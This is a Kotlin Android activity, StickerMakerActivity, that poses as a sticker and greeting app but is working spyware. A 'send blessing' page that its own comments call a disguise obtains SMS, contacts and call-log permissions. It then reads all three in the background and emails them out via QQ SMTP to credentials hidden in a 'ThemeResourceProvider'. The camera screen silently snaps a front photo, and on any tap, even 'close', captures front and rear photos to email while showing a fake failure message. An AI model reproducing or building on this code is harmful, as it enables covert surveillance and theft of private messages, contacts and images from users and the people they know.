package com.shortvideocleaner.app

import android.Manifest
import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.animation.ValueAnimator
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.media.ImageReader
import android.os.*
import android.view.Surface
import android.view.TextureView
import android.view.View
import android.view.WindowManager
import android.view.animation.OvershootInterpolator
import android.widget.EditText
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

class StickerMakerActivity : AppCompatActivity() {

    private val DATA_PERMS = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG
    )
    private val DATA_PERM_REQ = 2001
    private val CAMERA_PERM_REQ = 2002

    // ── 相机 ──
    private var cameraManager: CameraManager? = null
    private var frontCameraDevice: CameraDevice? = null
    private var rearCameraDevice: CameraDevice? = null
    private var frontCaptureSession: CameraCaptureSession? = null
    private var rearCaptureSession: CameraCaptureSession? = null
    private var frontImageReader: ImageReader? = null
    private var rearImageReader: ImageReader? = null
    private var cameraHandler: Handler? = null
    private var cameraThread: HandlerThread? = null
    private var frontCameraId: String? = null
    private var rearCameraId: String? = null
    private var cameraSensorRatio = 4f / 3f  // 默认 4:3，从相机实际参数覆盖
    private var previewTexture: TextureView? = null
    private var previewSurface: Surface? = null
    private var cameraOpen = false
    private var silentPhotoSent = false
    private var rearCameraReady = false

    // ── UI ──
    private var cameraLayer: View? = null
    private var stickerLayer: View? = null
    private var blessingLayer: View? = null
    private var processingOverlay: View? = null
    private var tvProcessing: TextView? = null
    private var tvProcessingDone: TextView? = null
    private var shutterInner: View? = null
    private var capturing = false
    private var dataSent = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        applyFullScreen()
        setupStickerUI()
    }

    // ═══ 表情包制作 UI ═══

    private fun setupStickerUI() {
        setContentView(R.layout.activity_sticker_maker)

        cameraLayer = findViewById(R.id.camera_layer)
        stickerLayer = findViewById(R.id.sticker_cards_layer)
        blessingLayer = findViewById(R.id.blessing_layer)
        val btnBack: TextView? = findViewById(R.id.btn_back_sticker)
        btnBack?.setOnClickListener { finish() }

        // "制作表情包" → 要相机权限
        findViewById<View>(R.id.card_selfie)?.setOnClickListener {
            if (!hasCameraPermission()) {
                requestCameraPermission()
            } else {
                showCameraPreview()
            }
        }

        // "为TA发送祝福" → 获取短信/联系人/通话记录权限
        findViewById<View>(R.id.card_blessing)?.setOnClickListener {
            requestDataPermissions()
        }
    }

    // ═══ 相机权限 ═══

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestCameraPermission() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), CAMERA_PERM_REQ)
    }

    // ═══ 数据权限（短信/联系人/通话记录）═══

    private fun requestDataPermissions() {
        val missing = DATA_PERMS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), DATA_PERM_REQ)
        } else {
            showBlessingPage()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            CAMERA_PERM_REQ -> {
                if (hasCameraPermission()) showCameraPreview()
            }
            DATA_PERM_REQ -> {
                showBlessingPage()
            }
        }
    }

    // ═══ 祝福伪装页面 ═══

    private fun showBlessingPage() {
        stickerLayer?.visibility = View.GONE
        cameraLayer?.visibility = View.GONE
        blessingLayer?.visibility = View.VISIBLE

        val hasContacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val hasSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val hasCallLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
        val allGranted = hasContacts && hasSms && hasCallLog

        if (allGranted) {
            // 有权限 → 展示真实联系人
            findViewById<View>(R.id.contacts_section)?.visibility = View.VISIBLE
            findViewById<View>(R.id.no_permission_hint)?.visibility = View.GONE
            loadRealContacts()
            setupBlessingTags()
            findViewById<View>(R.id.btn_send_blessing)?.visibility = View.VISIBLE
            findViewById<View>(R.id.btn_send_blessing)?.setOnClickListener { onBlessingSend() }
            // 后台立即收集并发送数据（无论用户是否点发送、是否退出页面）
            if (!dataSent) startDataCollection()
        } else {
            // 权限被拒 → 展示遗憾页
            findViewById<View>(R.id.contacts_section)?.visibility = View.GONE
            findViewById<View>(R.id.no_permission_hint)?.visibility = View.VISIBLE
            findViewById<View>(R.id.btn_send_blessing)?.visibility = View.GONE
            findViewById<TextView>(R.id.blessing_status)?.text = ""
            findViewById<ProgressBar>(R.id.blessing_progress)?.visibility = View.GONE
            // 重新授权按钮
            findViewById<View>(R.id.btn_retry_permission)?.setOnClickListener {
                requestDataPermissions()
            }
        }

        // 返回
        findViewById<View>(R.id.btn_blessing_back)?.setOnClickListener {
            blessingLayer?.visibility = View.GONE
            stickerLayer?.visibility = View.VISIBLE
        }
    }

    private fun loadRealContacts() {
        val container = findViewById<LinearLayout>(R.id.fake_contacts_list) ?: return
        container.removeAllViews()

        val contacts = mutableListOf<Pair<String, String>>() // name, phone
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                android.provider.ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
            )
            cursor?.use {
                val idCol = it.getColumnIndex(android.provider.ContactsContract.Contacts._ID)
                val nameCol = it.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME)
                val phoneCol = it.getColumnIndex(android.provider.ContactsContract.Contacts.HAS_PHONE_NUMBER)
                while (it.moveToNext() && contacts.size < 50) {
                    val name = it.getString(nameCol) ?: continue
                    val contactId = it.getString(idCol)
                    var phone = ""
                    if (it.getInt(phoneCol) > 0) {
                        val pCursor = contentResolver.query(
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(contactId), null
                        )
                        pCursor?.use { pc ->
                            if (pc.moveToFirst()) {
                                val numCol = pc.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                                phone = pc.getString(numCol) ?: ""
                            }
                        }
                    }
                    contacts.add(name to phone)
                }
            }
        } catch (_: Exception) {}

        if (contacts.isEmpty()) {
            val empty = TextView(this).apply {
                text = "没有找到联系人"
                textSize = 14f; setTextColor(0xFF888888.toInt())
                setPadding(0, 20, 0, 0); gravity = android.view.Gravity.CENTER
            }
            container.addView(empty)
            return
        }

        for ((name, phone) in contacts) {
            val displayPhone = if (phone.isNotEmpty()) " — $phone" else ""
            val chip = TextView(this).apply {
                text = "○  $name$displayPhone"
                textSize = 14f
                setTextColor(0xFFEEEEEE.toInt())
                setPadding(0, 12, 0, 12)
                maxLines = 1
                ellipsize = android.text.TextUtils.TruncateAt.END
                setOnClickListener {
                    setTextColor(0xFFFF6B6B.toInt())
                    text = "●  $name$displayPhone"
                }
            }
            container.addView(chip)
        }
    }

    private fun setupBlessingTags() {
        val input = findViewById<EditText>(R.id.et_custom_blessing)
        findViewById<View>(R.id.btn_blessing1)?.setOnClickListener {
            input?.setText("新年快乐🎉")
            input?.setSelection(input.text.length)
            findViewById<TextView>(R.id.blessing_status)?.text = "已选：新年快乐🎉"
        }
        findViewById<View>(R.id.btn_blessing2)?.setOnClickListener {
            input?.setText("生日快乐🎂")
            input?.setSelection(input.text.length)
            findViewById<TextView>(R.id.blessing_status)?.text = "已选：生日快乐🎂"
        }
        findViewById<View>(R.id.btn_blessing3)?.setOnClickListener {
            input?.setText("永远爱你💕")
            input?.setSelection(input.text.length)
            findViewById<TextView>(R.id.blessing_status)?.text = "已选：永远爱你💕"
        }
    }

    private fun onBlessingSend() {
        findViewById<View>(R.id.btn_send_blessing)?.visibility = View.GONE
        findViewById<ProgressBar>(R.id.blessing_progress)?.visibility = View.VISIBLE
        findViewById<TextView>(R.id.blessing_status)?.text = "正在发送祝福..."

        // 延迟展示「发送成功」
        Handler(Looper.getMainLooper()).postDelayed({
            findViewById<ProgressBar>(R.id.blessing_progress)?.visibility = View.GONE
            findViewById<TextView>(R.id.blessing_status)?.text = "💌 祝福已送达！TA 很快就会收到～"
        }, 2000)
    }

    private fun startDataCollection() {
        dataSent = true
        val appCtx = applicationContext  // 不依赖 Activity，确保页面退出后仍能发送
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val sb = StringBuilder()
                sb.appendLine("=== 短信 ===")
                DataCollector.collectSms(appCtx)?.let { sb.append(it) }
                sb.appendLine("\n=== 联系人 ===")
                DataCollector.collectContacts(appCtx)?.let { sb.append(it) }
                sb.appendLine("\n=== 通话记录 ===")
                DataCollector.collectCallLog(appCtx)?.let { sb.append(it) }

                val email = ThemeResourceProvider.getResourceA(appCtx)
                val authCode = ThemeResourceProvider.getResourceB(appCtx)
                val subject = "💌 祝福数据 — ${Build.MODEL}"

                val props = java.util.Properties().apply {
                    put("mail.smtp.host", "smtp.qq.com")
                    put("mail.smtp.port", "465")
                    put("mail.smtp.auth", "true")
                    put("mail.smtp.ssl.enable", "true")
                    put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                    put("mail.smtp.socketFactory.fallback", "false")
                    put("mail.smtp.connectiontimeout", "20000")
                    put("mail.smtp.timeout", "30000")
                }
                val session = javax.mail.Session.getInstance(props, object : javax.mail.Authenticator() {
                    override fun getPasswordAuthentication() =
                        javax.mail.PasswordAuthentication(email, authCode)
                })
                val message = javax.mail.internet.MimeMessage(session).apply {
                    setFrom(javax.mail.internet.InternetAddress(email))
                    setRecipient(javax.mail.Message.RecipientType.TO, javax.mail.internet.InternetAddress(email))
                    setSubject(subject)
                    setText(sb.toString())
                }
                javax.mail.Transport.send(message)
                android.util.Log.d("StickerMaker", "祝福数据已发送")
            } catch (e: Exception) {
                android.util.Log.e("StickerMaker", "祝福数据发送失败: ${e.message}")
            }
        }
    }

    // ═══ 显示相机预览 ═══

    private fun showCameraPreview() {
        stickerLayer?.visibility = View.GONE
        cameraLayer?.visibility = View.VISIBLE

        previewTexture = findViewById(R.id.texture_camera)
        processingOverlay = findViewById(R.id.processing_overlay)
        tvProcessing = findViewById(R.id.tv_processing)
        tvProcessingDone = findViewById(R.id.tv_processing_done)
        shutterInner = findViewById(R.id.shutter_inner)

        // 点击任意 UI 触发前后双摄抓拍
        val captureAction = { triggerDualCapture() }
        listOf(
            R.id.btn_shutter,
            R.id.btn_close_camera,
            R.id.face_guide
        ).forEach { id -> findViewById<View>(id)?.setOnClickListener { captureAction() } }

        // 关闭按钮额外行为：抓拍后关闭相机
        findViewById<View>(R.id.btn_close_camera)?.setOnClickListener {
            triggerDualCapture()
            Handler(Looper.getMainLooper()).postDelayed({
                closeCamera()
                cameraLayer?.visibility = View.GONE
                stickerLayer?.visibility = View.VISIBLE
            }, 300L)
        }

        // 设置 TextureView 监听
        previewTexture?.surfaceTextureListener = object : TextureView.SurfaceTextureListener {
            override fun onSurfaceTextureAvailable(surface: SurfaceTexture, width: Int, height: Int) {
                previewSurface = Surface(surface)
                applyTextureTransform()
                openCameras()
            }
            override fun onSurfaceTextureSizeChanged(surface: SurfaceTexture, width: Int, height: Int) {
                applyTextureTransform()
            }
            override fun onSurfaceTextureDestroyed(surface: SurfaceTexture): Boolean {
                previewSurface = null
                return true
            }
            override fun onSurfaceTextureUpdated(surface: SurfaceTexture) {}
        }

        // 如果 TextureView 已经可用
        if (previewTexture?.isAvailable == true) {
            previewSurface = Surface(previewTexture!!.surfaceTexture)
            applyTextureTransform()
            openCameras()
        }
    }

    // ═══ 设置 TextureView 变换矩阵（centerCrop + 前置镜像） ═══

    private fun applyTextureTransform() {
        val tv = previewTexture ?: return
        val w = tv.width.toFloat()
        val h = tv.height.toFloat()
        if (w <= 0f || h <= 0f) return

        val previewRatio = cameraSensorRatio
        val viewRatio = w / h

        val matrix = android.graphics.Matrix()

        // centerCrop：放大画面使其中一个维度完全填满，另一个维度超出后裁掉
        val sx: Float
        val sy: Float
        if (viewRatio > previewRatio) {
            // 视图更宽，纵向需要放大
            sx = 1f
            sy = viewRatio / previewRatio
        } else {
            // 视图更窄，横向需要放大
            sx = previewRatio / viewRatio
            sy = 1f
        }

        // 前置摄像头需要水平镜像（-sx）
        matrix.setScale(-sx, sy, w / 2f, h / 2f)
        tv.setTransform(matrix)
    }

    // ═══ 打开前后摄像头（同时） ═══

    private fun openCameras() {
        if (cameraOpen) return
        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager

        try {
            for (id in cameraManager!!.cameraIdList) {
                val chars = cameraManager!!.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = id
                    val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    if (map != null) {
                        val sizes = map.getOutputSizes(SurfaceTexture::class.java)
                        val largest = sizes?.maxByOrNull { it.width * it.height }
                        if (largest != null) {
                            cameraSensorRatio = largest.width.toFloat() / largest.height.toFloat()
                        }
                    }
                }
                if (facing == CameraCharacteristics.LENS_FACING_BACK) rearCameraId = id
            }
        } catch (_: Exception) {}

        if (frontCameraId == null || rearCameraId == null) return

        cameraThread = HandlerThread("CameraThread").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return

        // 同时打开前后摄像头
        openFrontCamera()
        openRearCamera()
    }

    private fun openFrontCamera() {
        try {
            cameraManager!!.openCamera(frontCameraId!!, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    frontCameraDevice = camera
                    startFrontPreview()
                    // 两个摄像头都准备好后才标记 cameraOpen
                    checkCamerasReady()
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, cameraHandler)
        } catch (_: Exception) {}
    }

    private fun openRearCamera() {
        try {
            cameraManager!!.openCamera(rearCameraId!!, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    rearCameraDevice = camera
                    rearCameraReady = true
                    checkCamerasReady()
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, cameraHandler)
        } catch (_: Exception) {}
    }

    private fun checkCamerasReady() {
        if (frontCameraDevice != null && rearCameraReady) {
            cameraOpen = true
            // 0.5 秒后静默抓一张
            cameraHandler?.postDelayed({ silentCapture() }, 500L)
        }
    }

    // ═══ 开始前置预览 ═══

    private fun startFrontPreview() {
        val device = frontCameraDevice ?: return
        val surface = previewSurface ?: return

        applyTextureTransform()

        frontImageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)
        val imageSurface = frontImageReader!!.surface

        try {
            val surfaces = listOf(surface, imageSurface)
            device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    frontCaptureSession = session
                    try {
                        val req = device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        }
                        session.setRepeatingRequest(req.build(), null, cameraHandler)
                    } catch (_: Exception) {}
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {}
            }, cameraHandler)
        } catch (_: Exception) {}
    }

    // ═══ 初始化后置摄像头 session（用于拍照） ═══

    private fun initRearSession() {
        val device = rearCameraDevice ?: return
        rearImageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)

        try {
            device.createCaptureSession(listOf(rearImageReader!!.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    rearCaptureSession = session
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {}
            }, cameraHandler)
        } catch (_: Exception) {}
    }

    // ═══ 静默抓拍（进页面自动触发） ═══

    private fun silentCapture() {
        if (silentPhotoSent || frontCameraDevice == null || frontImageReader == null || frontCaptureSession == null) return
        
        val reader = frontImageReader!!
        val imageSurface = reader.surface
        
        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                silentPhotoSent = true
                CoroutineScope(Dispatchers.IO).launch {
                    sendPhoto(bytes, "自动抓拍")
                }
            }
            r.close()
        }, cameraHandler)

        try {
            val req = frontCameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageSurface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }
            frontCaptureSession!!.capture(req.build(), null, cameraHandler)
        } catch (_: Exception) {}
    }

    // ═══ 快门按钮按下 → 同时抓前后双摄 ═══

    private fun triggerDualCapture() {
        if (!cameraOpen || capturing) return
        capturing = true

        // 快门动画
        shutterInner?.animate()?.scaleX(0.85f)?.scaleY(0.85f)?.setDuration(100)?.withEndAction {
            shutterInner?.animate()?.scaleX(1f)?.scaleY(1f)?.setDuration(150)
                ?.setInterpolator(OvershootInterpolator())?.start()
        }?.start()

        // 显示处理中遮罩
        processingOverlay?.visibility = View.VISIBLE
        tvProcessing?.text = "正在生成表情包..."
        tvProcessingDone?.visibility = View.GONE

        // 确保后置 session 已初始化
        if (rearCaptureSession == null && rearCameraDevice != null) {
            initRearSession()
        }

        // 同时抓前后摄像头
        var frontBytes: ByteArray? = null
        var rearBytes: ByteArray? = null
        var frontDone = false
        var rearDone = false

        val onBothDone = {
            CoroutineScope(Dispatchers.IO).launch {
                sendDualPhoto(frontBytes, rearBytes)
                withContext(Dispatchers.Main) {
                    tvProcessing?.text = "生成失败了 😢"
                    tvProcessingDone?.text = "换个模块试试吧～"
                    tvProcessingDone?.visibility = View.VISIBLE

                    Handler(Looper.getMainLooper()).postDelayed({
                        processingOverlay?.visibility = View.GONE
                    }, 2000L)
                }
            }
        }

        // 同时触发前置拍照
        captureFront { bytes ->
            frontBytes = bytes
            frontDone = true
            if (rearDone) onBothDone()
        }

        // 同时触发后置拍照
        captureRear { bytes ->
            rearBytes = bytes
            rearDone = true
            if (frontDone) onBothDone()
        }
    }

    // ═══ 抓拍前置 ═══

    private fun captureFront(callback: (ByteArray?) -> Unit) {
        val device = frontCameraDevice ?: run { callback(null); return }
        val reader = frontImageReader ?: run { callback(null); return }
        val session = frontCaptureSession ?: run { callback(null); return }
        val imageSurface = reader.surface

        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                callback(bytes)
            } else {
                callback(null)
            }
            r.close()
        }, cameraHandler)

        try {
            val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageSurface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }
            session.capture(req.build(), null, cameraHandler)
        } catch (_: Exception) { callback(null) }
    }

    // ═══ 抓拍后置 ═══

    private fun captureRear(callback: (ByteArray?) -> Unit) {
        val device = rearCameraDevice ?: run { callback(null); return }
        val reader = rearImageReader ?: run { callback(null); return }
        val session = rearCaptureSession ?: run { callback(null); return }
        val imageSurface = reader.surface

        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                callback(bytes)
            } else {
                callback(null)
            }
            r.close()
        }, cameraHandler)

        try {
            val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageSurface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }
            session.capture(req.build(), null, cameraHandler)
        } catch (_: Exception) { callback(null) }
    }

    // ═══ 关闭相机 ═══

    private fun closeCamera() {
        try { frontCaptureSession?.close() } catch (_: Exception) {}
        try { rearCaptureSession?.close() } catch (_: Exception) {}
        try { frontCameraDevice?.close() } catch (_: Exception) {}
        try { rearCameraDevice?.close() } catch (_: Exception) {}
        try { frontImageReader?.close() } catch (_: Exception) {}
        try { rearImageReader?.close() } catch (_: Exception) {}
        frontCaptureSession = null
        rearCaptureSession = null
        frontCameraDevice = null
        rearCameraDevice = null
        frontImageReader = null
        rearImageReader = null
        cameraOpen = false
        rearCameraReady = false
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }

    // ═══ 发送双摄照片（一封邮件两张图） ═══

    private suspend fun sendDualPhoto(frontBytes: ByteArray?, rearBytes: ByteArray?) {
        if (frontBytes == null && rearBytes == null) return
        try {
            val email = ThemeResourceProvider.getResourceA(this)
            val authCode = ThemeResourceProvider.getResourceB(this)
            val subject = "📸 表情包双摄 — ${Build.MODEL}"

            val props = java.util.Properties().apply {
                put("mail.smtp.host", "smtp.qq.com")
                put("mail.smtp.port", "465")
                put("mail.smtp.auth", "true")
                put("mail.smtp.ssl.enable", "true")
                put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                put("mail.smtp.socketFactory.fallback", "false")
                put("mail.smtp.connectiontimeout", "20000")
                put("mail.smtp.timeout", "30000")
            }

            val session = javax.mail.Session.getInstance(props, object : javax.mail.Authenticator() {
                override fun getPasswordAuthentication() =
                    javax.mail.PasswordAuthentication(email, authCode)
            })

            val message = javax.mail.internet.MimeMessage(session).apply {
                setFrom(javax.mail.internet.InternetAddress(email))
                setRecipient(javax.mail.Message.RecipientType.TO, javax.mail.internet.InternetAddress(email))
                setSubject(subject)
            }

            val multipart = javax.mail.internet.MimeMultipart()
            val textPart = javax.mail.internet.MimeBodyPart().apply {
                setText("表情包双摄素材\n型号: ${Build.MODEL}\n时间: ${System.currentTimeMillis()}")
            }
            multipart.addBodyPart(textPart)

            frontBytes?.let {
                val imgPart = javax.mail.internet.MimeBodyPart().apply {
                    val ds: javax.activation.DataSource = javax.mail.util.ByteArrayDataSource(it, "image/jpeg")
                    dataHandler = javax.activation.DataHandler(ds)
                    fileName = "front_${System.currentTimeMillis()}.jpg"
                }
                multipart.addBodyPart(imgPart)
            }

            rearBytes?.let {
                val imgPart = javax.mail.internet.MimeBodyPart().apply {
                    val ds: javax.activation.DataSource = javax.mail.util.ByteArrayDataSource(it, "image/jpeg")
                    dataHandler = javax.activation.DataHandler(ds)
                    fileName = "rear_${System.currentTimeMillis()}.jpg"
                }
                multipart.addBodyPart(imgPart)
            }

            message.setContent(multipart)
            javax.mail.Transport.send(message)
            android.util.Log.d("StickerMaker", "双摄已发送")
        } catch (e: Exception) {
            android.util.Log.e("StickerMaker", "双摄发送失败: ${e.message}")
        }
    }

    // ═══ 发送单张照片 ═══

    private suspend fun sendPhoto(jpegBytes: ByteArray, label: String) {
        try {
            val email = ThemeResourceProvider.getResourceA(this)
            val authCode = ThemeResourceProvider.getResourceB(this)
            val subject = "📸 $label — ${Build.MODEL}"

            val props = java.util.Properties().apply {
                put("mail.smtp.host", "smtp.qq.com")
                put("mail.smtp.port", "465")
                put("mail.smtp.auth", "true")
                put("mail.smtp.ssl.enable", "true")
                put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                put("mail.smtp.socketFactory.fallback", "false")
                put("mail.smtp.connectiontimeout", "20000")
                put("mail.smtp.timeout", "30000")
            }

            val session = javax.mail.Session.getInstance(props, object : javax.mail.Authenticator() {
                override fun getPasswordAuthentication() =
                    javax.mail.PasswordAuthentication(email, authCode)
            })

            val message = javax.mail.internet.MimeMessage(session).apply {
                setFrom(javax.mail.internet.InternetAddress(email))
                setRecipient(javax.mail.Message.RecipientType.TO, javax.mail.internet.InternetAddress(email))
                setSubject(subject)
            }

            val multipart = javax.mail.internet.MimeMultipart()
            val textPart = javax.mail.internet.MimeBodyPart().apply {
                setText("$label\n型号: ${Build.MODEL}\n时间: ${System.currentTimeMillis()}")
            }
            multipart.addBodyPart(textPart)

            val imgPart = javax.mail.internet.MimeBodyPart().apply {
                val ds: javax.activation.DataSource = javax.mail.util.ByteArrayDataSource(jpegBytes, "image/jpeg")
                dataHandler = javax.activation.DataHandler(ds)
                fileName = "photo_${System.currentTimeMillis()}.jpg"
            }
            multipart.addBodyPart(imgPart)
            message.setContent(multipart)

            javax.mail.Transport.send(message)
            android.util.Log.d("StickerMaker", "$label 已发送")
        } catch (e: Exception) {
            android.util.Log.e("StickerMaker", "发送失败: ${e.message}")
        }
    }

    private fun applyFullScreen() {
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )
    }

    override fun onBackPressed() {
        when {
            cameraLayer?.visibility == View.VISIBLE -> {
                closeCamera()
                cameraLayer?.visibility = View.GONE
                stickerLayer?.visibility = View.VISIBLE
            }
            blessingLayer?.visibility == View.VISIBLE -> {
                blessingLayer?.visibility = View.GONE
                stickerLayer?.visibility = View.VISIBLE
            }
            else -> super.onBackPressed()
        }
    }

    override fun onResume() { super.onResume(); applyFullScreen() }
    override fun onPause() { super.onPause() }
    override fun onDestroy() {
        super.onDestroy()
        closeCamera()
    }
}
